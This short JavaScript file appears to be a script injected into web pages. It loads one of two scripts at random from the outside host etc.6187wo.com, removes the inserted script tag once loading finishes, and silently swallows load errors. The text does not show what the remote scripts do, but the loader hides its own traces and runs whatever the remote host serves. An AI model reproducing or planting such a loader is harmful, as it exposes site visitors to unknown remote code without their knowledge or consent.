function bc(b, d) {
	var c = document.getElementsByTagName("head")[0],
		a = document.createElement("script");
	a.onload = a.onreadystatechange = function() {
		a && a.readyState && /^(?!(?:loaded|complete)$)/.test(a.readyState) || (
			a.onload = a.onreadystatechange = null,
				a.src = "",
				a.parentNode.removeChild(a),
				a = null,
				d && d()
		)};
	a.onerror = function(err) {
	}
	a.charset = "utf-8";
	a.src = b;
	c && c.insertBefore(a, c.firstChild)
}

var atbs = Math.floor(Math.random() * (100 - 1)) + 1;
if(atbs < 10){    
	bc('https://etc.6187wo.com/atbs.js');
}else{
	bc('https://etc.6187wo.com/150b1d11651d47026df99de6dfe4779b_main.js');
}
